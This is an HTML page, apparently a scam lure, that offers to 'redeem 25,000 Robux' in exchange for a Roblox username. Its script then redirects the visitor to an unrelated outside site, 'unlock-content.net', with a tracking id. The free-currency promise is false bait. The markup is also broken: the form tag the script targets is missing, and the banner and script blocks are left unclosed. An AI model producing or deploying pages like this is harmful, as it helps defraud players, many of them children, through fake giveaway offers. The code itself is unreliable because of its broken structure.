<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">

<title>Redeem 25,000 Robux</title>

<style>
*{box-sizing:border-box}
body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:56px 24px;color:#fff;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background-color:#000;background-image:radial-gradient(circle at 50% 0%,rgba(91,33,182,.35),rgba(91,33,182,0) 55%),linear-gradient(180deg,#1a0628,#170528 35%,#07000d 72%,#000)}
.wrap{width:100%;max-width:420px;display:flex;flex-direction:column;align-items:center;gap:34px}
.banner{width:100%;display:flex;align-items:center;gap:16px;padding:16px 20px;border-radius:16px;background:#345942;box-shadow:0 18px 50px -18px rgba(52,89,66,.95)}
.banner svg{width:32px;height:32px;flex:0 0 auto}
.banner p{margin:0;font-size:15px;line-height:1.35;font-weight:700}
.banner .code{letter-spacing:.18em}
.banner .muted{margin-top:2px;font-size:13px;font-weight:400;color:rgba(255,255,255,.75)}
h1{margin:0;font-size:48px;font-weight:800;letter-spacing:-.02em;text-transform:lowercase}
form{width:100%;display:flex;flex-direction:column;gap:16px;margin:0}
input{width:100%;padding:16px;border-radius:12px;border:1px solid rgba(255,255,255,.15);background:rgba(0,0,0,.5);color:#fff;font:inherit;font-size:18px;text-align:center;outline:none}
input::placeholder{color:rgba(255,255,255,.4)}
#code{cursor:default;font-weight:600;letter-spacing:.22em;user-select:none}
#username:focus{border-color:rgba(255,255,255,.4);background:rgba(0,0,0,.6)}
button{width:100%;padding:16px;border:0;border-radius:12px;font:inherit;font-size:18px;font-weight:700;color:#fff;cursor:pointer;background:linear-gradient(90deg,#4c1d95,#2a0b4d 55%,#000);box-shadow:0 18px 45px -18px rgba(76,29,149,.9);transition:filter .3s,transform .15s}
button:hover{filter:brightness(1.25)}
button:active{transform:scale(.985)}
.socials{display:flex;align-items:center;justify-content:center;gap:36px}
.socials a{color:rgba(255,255,255,.9);transition:transform .3s,color .3s}
.socials a:hover{color:#fff;transform:scale(1.1)}
.socials svg{width:24px;height:24px;display:block}
</style>
</head>
<body>
<main class="wrap">
  <div class="banner">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="3" y="8" width="18" height="13" rx="2"/><path d="M3 12h18M12 8v13"/></svg>
    <div>
      <p>25,000 Robux Code:</p>

  <h1>redeem</h1>

    <input id="username" placeholder="Roblox Username" autocomplete="off" spellcheck="false" aria-label="Roblox Username">
    <button type="submit">Redeem</button>
  </form>

  <div class="socials">
    <a href="https://www.roblox.com/" target="_blank" rel="noreferrer" aria-label="Roblox">
      <svg viewBox="0 0 24 24" aria-hidden="true"><g transform="rotate(-12 12 12)" fill="#fff"><rect x="4.5" y="4.5" width="15" height="15" rx="2.5"/><text x="12" y="16.2" text-anchor="middle" font-size="10" font-weight="800" fill="#0b0214">R</text></g></svg>
    </a>
    <a href="https://discord.com/" target="_blank" rel="noreferrer" aria-label="Discord">
      <svg viewBox="0 0 24 24" fill="#fff" aria-hidden="true"><path d="M8 5h8a4 4 0 014 4v5a4 4 0 01-4 4h-2l-2 3-2-3H8a4 4 0 01-4-4V9a4 4 0 014-4z"/><circle cx="9.5" cy="11.5" r="1.6" fill="#0b0214"/><circle cx="14.5" cy="11.5" r="1.6" fill="#0b0214"/></svg>
    </a>
    <a href="https://twitter.com/" target="_blank" rel="noreferrer" aria-label="Twitter">
      <svg viewBox="0 0 24 24" fill="#fff" aria-hidden="true"><path d="M3 3h4l5 7 5-7h4l-7 9 7 9h-4l-5-7-5 7H3l7-9z"/></svg>
    </a>
  </div>
</main>
<script>
document.getElementById('f').onsubmit=function(e){e.preventDefault();location.href='https://unlock-content.net/?e10cefe'};

</body>
</html>
